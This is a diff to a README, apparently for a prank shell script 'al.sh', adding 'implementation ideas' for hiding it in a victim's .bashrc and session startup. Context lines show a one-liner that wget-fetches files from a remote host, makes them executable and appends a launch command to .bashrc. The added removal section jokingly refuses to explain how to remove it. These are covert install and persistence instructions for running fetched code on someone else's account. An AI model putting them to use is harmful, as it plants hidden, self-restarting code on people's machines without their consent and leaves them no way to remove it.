@@ -18,6 +18,8 @@ Run via
 ```bash
     ./al.sh & disown $!
 ```
+
+## Implementation ideas BASHRC##
 Hide in their bashrc
 ```bash
     ./{PATH_TO_FILE}/al.sh & disown $!
@@ -29,3 +31,13 @@ Do everything via: mkdir
     wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh \
     && echo ". ~/config/al/al.sh & disown $!" >> ~/.bashrc
 ```
+## Implementation ideas StartUP Command##
+https://help.ubuntu.com/community/AddingProgramToSessionStartup
+```bash
+    ./{PATH_TO_FILE}/al.sh & disown $!
+```
+
+
+## Removal Instructions ##
+------------------------
+Really? You want to get rid of this amazing piece of code that inhances your life more than sliced bread?
